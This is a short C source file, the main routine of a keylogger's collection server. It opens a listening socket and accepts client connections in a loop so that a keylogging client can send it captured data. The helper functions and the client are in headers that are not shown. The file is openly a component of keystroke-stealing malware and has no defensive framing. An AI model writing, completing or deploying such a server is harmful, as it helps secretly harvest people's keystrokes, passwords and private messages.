/*
Script to run to create the key logging server to which the client
can send data
*/

#include "keylogger.h"
#include "server.h"
#include "server_utils.h"

int main(void) {
  struct sockaddr_in server_addr = socket_address(INADDR_ANY, PORT);
  keylog_server* server = make_keylog_server(server_addr, BACKLOG_SIZE);
  listen_for_connections(server);
  int accept_status = 0;
  while (accept_status != -1) {
    accept_status = accept_client(server);
  }
  free_keylog_server(server);
  return 0;
}
